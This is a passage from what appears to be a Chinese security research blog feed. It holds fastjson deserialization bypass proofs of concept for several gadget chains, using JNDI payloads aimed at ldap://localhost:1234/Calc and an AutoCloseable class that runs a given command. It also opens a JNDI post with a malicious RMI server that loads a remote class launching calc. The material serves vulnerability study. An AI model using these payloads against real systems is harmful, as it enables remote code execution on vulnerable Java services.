title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要shiro组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-9"><a href="#调试分析-9" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h2 id="anteros链"><a href="#anteros链" class="headerlink" title="anteros链"></a>anteros链</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>绕过禁用类黑名单。</p><h3 id="Exp-10"><a href="#Exp-10" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;com.codahale.metrics&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;metrics-healthchecks&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;3.0.2&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;Anteros-Core&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;Anteros-DBCP&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.0.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_66_b</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;;</span></span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="限制-10"><a href="#限制-10" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要metrics-healthchecks、Anteros-Core、Anteros-DBCP组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-10"><a href="#调试分析-10" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h2 id="IbatisSqlmap链"><a href="#IbatisSqlmap链" class="headerlink" title="IbatisSqlmap链"></a>IbatisSqlmap链</h2><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>绕过禁用类黑名单。</p><h3 id="Exp-11"><a href="#Exp-11" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.ibatis&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;ibatis-sqlmap&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.3.4.726&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;javax&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;javaee-api&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;8.0.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_66_c</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="限制-11"><a href="#限制-11" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要ibatis-sqlmap、javaee组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-11"><a href="#调试分析-11" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h1 id="1-2-25-1-2-67"><a href="#1-2-25-1-2-67" class="headerlink" title="1.2.25-1.2.67"></a>1.2.25-1.2.67</h1><h2 id="igniteJta链"><a href="#igniteJta链" class="headerlink" title="igniteJta链"></a>igniteJta链</h2><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>禁用黑名单绕过。</p><h3 id="Exp-12"><a href="#Exp-12" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;ignite-jta&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.8.0&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_67_a</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/Calc\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="限制-12"><a href="#限制-12" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要ignite-jta组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-12"><a href="#调试分析-12" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h3 id="shiro链-1"><a href="#shiro链-1" class="headerlink" title="shiro链"></a>shiro链</h3><h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>禁用黑名单绕过。</p><h3 id="Exp-13"><a href="#Exp-13" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">          &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.2.4&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_67_b</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="限制-13"><a href="#限制-13" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要shiro组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-13"><a href="#调试分析-13" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h1 id="1-2-25-1-2-68"><a href="#1-2-25-1-2-68" class="headerlink" title="1.2.25-1.2.68"></a>1.2.25-1.2.68</h1><h2 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>利用expectClass绕过AutoType，不是黑名单绕过，不需要开autoTypeSupport。</p><h2 id="Exp-14"><a href="#Exp-14" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_68</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;Poc.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="限制-14"><a href="#限制-14" class="headerlink" title="限制"></a>限制</h2><ul><li>需要在Server端有实现了AutoCloseable的类或者子类</li></ul><h2 id="调试分析-14"><a href="#调试分析-14" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p><h1 id="1-2-25-1-2-83"><a href="#1-2-25-1-2-83" class="headerlink" title="1.2.25-1.2.83"></a>1.2.25-1.2.83</h1><h2 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>绕过禁用类黑名单。<br>利用springboot环境下的commons-dao组件，进行jndi注入。</p><h2 id="Exp-15"><a href="#Exp-15" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;parent&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.6.7&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line"><span class="comment">    &lt;/parent&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;com.epam.reportportal&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;commons-dao&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;5.0.0&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_83</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.epam.ta.reportportal.config.DataSourceConfig\&quot;,\&quot;metricRegistry\&quot;: \&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="限制-15"><a href="#限制-15" class="headerlink" title="限制"></a>限制</h2><ul><li>需要开启autoTypeSupport</li><li>需要springboot环境、commons-dao组件</li><li>利用jndi执行命令，受JDK版本限制</li></ul><h2 id="调试分析-15"><a href="#调试分析-15" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>挠头，fastjson这么多利用，给我语雀都整卡了&#x3D; &#x3D;</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>fastjson反序列化 漏洞分析文章<br><a href="http://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">1.2.48之后的利用@mi1k7ea</a><br><a href="https://www.mi1k7ea.com/archives/">mi1k7ea师傅的fastjson漏洞分析系列  很详细适合学习</a><br><a href="https://su18.org/post/fastjson">su18师傅 比上一个简略</a><br><a href="https://tttang.com/archive/1579/#toc_fastjson">https://tttang.com/archive/1579/</a><br><a href="https://xz.aliyun.com/t/12096">https://xz.aliyun.com/t/12096</a><br><strong>关闭ASM开关，方便进行调试</strong><br><a href="https://blog.csdn.net/qq_45854465/article/details/120960671">https://blog.csdn.net/qq_45854465&#x2F;article&#x2F;details&#x2F;120960671</a><br>ASM动态加载相关，如何查看内存生成的类的源码<br><a href="https://juejin.cn/post/6974566732224528392#heading-6">https://juejin.cn/post/6974566732224528392#heading-6</a><br><a href="https://blog.csdn.net/wjy160925/article/details/85288569">https://blog.csdn.net/wjy160925/article/details/85288569</a><br>toJSONString()方法的源码分析（较浅）<br><a href="https://blog.csdn.net/qq_31615049/article/details/85013129">https://blog.csdn.net/qq_31615049&#x2F;article&#x2F;details&#x2F;85013129</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;fastjson是阿里巴巴旗下的一个Java库，用于Java对象和JSON字符串之间的转换。&lt;br&gt;这个库从2017-2022年，陆陆续续爆</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Fastjson" scheme="https://jaspersec.top/tags/Fastjson/"/>
    
  </entry>
  
  <entry>
    <title>JNDI漏洞分析</title>
    <link href="https://jaspersec.top/posts/2402071288.html"/>
    <id>https://jaspersec.top/posts/2402071288.html</id>
    <published>2023-12-24T03:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>根据官方教程，JNDI（Java Naming and Directory Interface）是为Java程序提供的，一组用来统一调用命名服务和目录服务的API，逻辑结构如下：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695623288583-539c93f5-6410-49af-8be7-1cd1e383c734.png" alt="image.png"><br>可以看到下面的SPI中，有熟悉的RMI服务和DNS服务，也有没用过的CORBA和LDAP服务等。<br>那么到底什么是JNDI？<br>一句话说：接口一词在计算机系统中再常见不过，所谓JNDI，就是屏蔽掉上面说到的服务的底层细节，提供一套统一的接口来调用这些服务，<strong>我的理解就是一层封装</strong>。</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>前面说到，JNDI支持命名服务和目录服务，而它在绑定一个对象时，可以采用引用（Reference）来存储，可以理解成一个指针&#x2F;引用。<br>恶意的JNDIServer端先bind一个引用对象，JNDIClient端从JNDIServer端lookup这个引用对象的时候，如果Client端本地不存在对应类名的类，就会去引用对象里定义的位置加载定义的类，而指定位置是支持http等远程协议的，这就导致了远程类加载问题，这也是这个洞的核心所在，<strong>一图胜千言</strong>。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695631419587-44e38e24-8b10-4b59-812f-419eff01b261.png" alt="image.png"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>JNDI这个洞最早是2016年的BlackHat爆出来的，之后陆陆续续进行了几次修复，就jdk8u版本来说，节点可以分为：8u121之前、8u121到8u191、8u191之后三个阶段，笔者也以漏洞修复的时间线，对不同的利用进行分析。</p><h2 id="JNDI操纵RMI"><a href="#JNDI操纵RMI" class="headerlink" title="JNDI操纵RMI"></a>JNDI操纵RMI</h2><p>适用JDK版本：&lt;8u121<br>测试JDK版本：8u65</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">//        initialContext.bind(&quot;rmi://localhost:1099/remoteObj&quot;,new RemoteObjectImpl());</span></span><br><span class="line">        <span class="comment">// 绑定的引用对象指定到了远程服务器上的恶意类</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Jasper&quot;</span>, <span class="string">&quot;Calc&quot;</span>, <span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,reference);</span><br><span class="line">        System.out.println(<span class="string">&quot;Server start...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span 